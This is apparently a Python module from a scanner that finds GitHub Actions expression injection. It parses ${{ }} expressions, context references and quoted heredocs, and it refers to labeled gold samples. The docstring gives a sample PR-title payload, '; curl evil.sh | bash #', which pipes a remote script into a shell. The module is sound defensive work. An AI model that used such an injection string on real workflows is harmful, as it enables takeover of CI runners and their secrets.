"""
GitHub Actions expression scanning.

Why this matters: `${{ ... }}` in a `run:` block is TEXT-SUBSTITUTED by the
Actions runner *before* the shell ever sees the script. So a PR title of
    "; curl evil.sh | bash #
becomes shell source. Quoting inside the YAML does not save you; the
substitution happens first. That is the whole bug class.

This module finds every `${{ }}` and every context reference inside it,
carrying byte offsets so the taint engine can report exact line numbers.

Handled forms:
    ${{ github.head_ref }}
    ${{ github['head_ref'] }}
    ${{ format('{0}-{1}', github.head_ref, inputs.x) }}
    ${{ github.head_ref || github.ref_name }}
    ${{ fromJSON(inputs.data).title }}
    ${{ contains(github.event.pull_request.title, 'x') && ... }}
String literals are skipped so 'github.head_ref' inside quotes is not a ref.
"""
from __future__ import annotations

import re
from dataclasses import dataclass
from typing import List

# Function names that are NOT context roots.
FUNCS = {
    "contains", "startswith", "endswith", "format", "join", "tojson",
    "fromjson", "hashfiles", "success", "always", "cancelled", "failure",
    "true", "false", "null", "and", "or", "not",
}

# Context roots that can carry data.
ROOTS = {"github", "inputs", "env", "steps", "needs", "jobs", "matrix", "vars", "secrets", "runner", "job", "strategy"}

_EXPR = re.compile(r"\$\{\{(.*?)\}\}", re.DOTALL)

# ident ( .ident | ['str'] | ["str"] | [int] )*
_REF = re.compile(
    r"""
    (?<![\w.'"])
    ([A-Za-z_][A-Za-z0-9_-]*)
    (
        (?:
            \s*\.\s*[A-Za-z_][A-Za-z0-9_-]*
          | \s*\[\s*'[^']*'\s*\]
          | \s*\[\s*"[^"]*"\s*\]
          | \s*\[\s*\d+\s*\]
          | \s*\[\s*\*\s*\]
        )+
    )
    """,
    re.VERBOSE,
)

_STRLIT = re.compile(r"'(?:[^']|'')*'")


@dataclass(frozen=True)
class Ref:
    """A context reference inside an expression."""
    path: str          # raw text, e.g. "github.event.pull_request.title"
    start: int         # byte offset in the containing string
    end: int

    @property
    def root(self) -> str:
        return re.split(r"[.\[]", self.path, 1)[0].lower()


@dataclass(frozen=True)
class Expression:
    """One ${{ ... }} occurrence."""
    text: str          # inner text, without the ${{ }}
    start: int         # offset of the '$' in the containing string
    end: int           # offset just past the '}}'
    refs: List[Ref]

    @property
    def raw(self) -> str:
        return "${{" + self.text + "}}"


def _mask_strings(s: str) -> str:
    """Blank out '...' literals, preserving length/offsets."""
    return _STRLIT.sub(lambda m: " " * (m.end() - m.start()), s)


def find_refs(inner: str, base: int = 0) -> List[Ref]:
    masked = _mask_strings(inner)
    out: List[Ref] = []
    for m in _REF.finditer(masked):
        root = m.group(1).lower()
        if root in FUNCS or root not in ROOTS:
            continue
        path = inner[m.start() : m.end()]
        out.append(Ref(path=path, start=base + m.start(), end=base + m.end()))
    return out


def find_expressions(s: str) -> List[Expression]:
    """All ${{ }} in a string, with refs resolved."""
    out: List[Expression] = []
    for m in _EXPR.finditer(s):
        inner = m.group(1)
        out.append(
            Expression(
                text=inner,
                start=m.start(),
                end=m.end(),
                refs=find_refs(inner, base=m.start(1)),
            )
        )
    return out


def has_expression(s: str) -> bool:
    return bool(_EXPR.search(s))


# `cat <<'EOF'` / `<<-"EOF"` / `<<\EOF`: a QUOTED delimiter means the shell does
# no expansion or command substitution in the body -- it is literal data. GHA
# still text-substitutes ${{ }} into it, but the result cannot execute, so it is
# not an injection sink. Gold relies on this: sample 63c49563 pipes
# `github.event.head_commit.message` through `cat <<'EOF'` and is labeled CLEAN.
# An UNQUOTED `<<EOF` does expand, so it stays a sink.
_HEREDOC = re.compile(
    r"""<<-?\s*(?:(?P<q>['"])(?P<qd>[A-Za-z_][A-Za-z0-9_]*)(?P=q)"""
    r"""|\\(?P<bd>[A-Za-z_][A-Za-z0-9_]*)"""
    r"""|(?P<ud>[A-Za-z_][A-Za-z0-9_]*))"""
)


def literal_heredoc_spans(s: str) -> List[tuple]:
    """Char-offset spans of quoted-delimiter heredoc bodies (no shell expansion)."""
    spans, off, pending = [], 0, None
    for line in s.split("\n"):
        if pending is None:
            m = _HEREDOC.search(line)
            if m and (m.group("qd") or m.group("bd")):
                pending = (m.group("qd") or m.group("bd"), off + len(line) + 1)
        else:
            delim, start = pending
            if line.strip() == delim:
                spans.append((start, off))
                pending = None
        off += len(line) + 1
    if pending:
        spans.append((pending[1], len(s)))
    return spans


def in_spans(pos: int, spans) -> bool:
    return any(a <= pos < b for a, b in spans)
